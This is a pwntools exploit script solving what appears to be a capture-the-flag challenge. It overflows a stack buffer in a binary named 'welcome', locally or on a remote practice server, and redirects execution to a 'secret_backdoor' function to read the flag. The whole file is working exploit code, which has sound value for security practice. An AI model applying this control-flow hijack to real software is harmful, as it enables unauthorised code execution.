from pwn import *
# Set up pwntools for the correct architecture
exe = context.binary = ELF('./welcome')
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('pwnable.co.il', 9000)
    else:
        return process([exe.path] + argv, *a, **kw)
# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

ret = p64(0x40057e)
padding = b'A' * 40
payload = padding + ret + p64(exe.sym['secret_backdoor'])

io.sendline(payload)
io.sendline("cat flag.txt")
io.interactive()